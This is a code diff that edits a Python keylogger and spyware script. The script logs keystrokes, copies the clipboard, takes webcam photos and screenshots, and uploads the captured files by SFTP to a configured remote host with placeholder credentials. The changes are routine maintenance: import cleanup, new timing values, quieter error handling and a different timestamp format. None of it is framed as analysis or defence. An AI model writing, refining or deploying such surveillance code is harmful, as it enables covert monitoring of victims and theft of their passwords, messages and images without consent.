@@ -1,34 +1,21 @@
 # Libraries
-import cv2
-from threading import Timer
-import pysftp
-import socket
-import platform
-import win32clipboard
-import sys
-
-from pynput.keyboard import Key, Listener
-import pyscreenshot
-
-import time
 import os
+import time
 
-from cryptography.fernet import Fernet
-from cryptography.hazmat.backends import default_backend
-
-import getpass
-from requests import get
-
-from multiprocessing import Process, freeze_support
+import cv2
+import pysftp
+import win32clipboard
 from PIL import ImageGrab
+from cryptography.fernet import Fernet
+from pynput.keyboard import Key, Listener
 
 keys_information = "key_log.txt"
 clipboard_information = "Clipboard.txt"
 camera_information = ".png"
 screenshot_information = ".png"
 
-time_iterations = 20
-number_of_iterations_end = 3
+time_iterations = 30
+number_of_iterations_end = 1
 
 myHostname = "192.168.1.16"  # change this
 myUsername = "pi"  # change this
@@ -45,7 +32,7 @@ try:
     os.makedirs(path, exist_ok=True)
     print("Directory Created")
 except OSError as error:
-    print("Directory exists")
+    pass
 
 file_path = path + extend
 
@@ -65,7 +52,7 @@ def copy_clipboard():
 
 # Captures Webcam using cv2 module
 def capture_webcam():
-    camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+    camera = cv2.VideoCapture(0)
     time_str = time.strftime("IMG_%Y%m%d_%H%M%S")  # To save each image with the time stamp
     check, frame = camera.read()
     cv2.waitKey(0)  # waits 0 milliseconds after each keypress
@@ -104,7 +91,7 @@ def sftp_files():
     with pysftp.Connection(host=myHostname, username=myUsername, password=myPassword) as sftp:
         print("Connection Successfully Established")
         sftp.chdir(remote_file)
-        time_str = time.strftime("log_%Y%m%d_%H%M")  # creates a time stamp to be used
+        time_str = time.strftime("log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
         sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
         print("Directory created")
         sftp.chdir(time_str)
@@ -224,4 +211,5 @@ while number_of_iterations < number_of_iterations_end:  # The keylogger will run
         stopTime = time.time() + time_iterations
 
 cv2.destroyAllWindows()
+
 
